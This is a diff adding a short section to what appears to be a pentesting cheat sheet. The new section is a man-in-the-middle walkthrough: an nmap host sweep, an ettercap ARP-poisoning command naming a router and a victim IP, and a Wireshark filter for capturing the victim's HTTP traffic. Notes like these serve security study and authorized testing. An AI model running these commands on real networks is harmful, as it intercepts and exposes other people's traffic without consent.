@@ -70,3 +70,26 @@ smbclient //192.123.28.3/demo
 ```
 smbmap -H host
 ```
+
+#### Mitm Attack Using Ettercap
+* Enumerate live hosts using nmap.
+
+```
+nmap -sn 192.168.3.0/24
+```
+
+```
+sudo ettercap -T -S -i eth0 -M arp:remote /10.0.0.1// /10.0.0.129//
+
+-T  - text only
+-S  - No ssl
+-M  - Method
+10.10.0.1  - Router
+10.0.0.129 - Victim
+```
+* Start Wireshark with root perm
+```
+ip.addr == 10.0.0.129 && http
+
+```
+
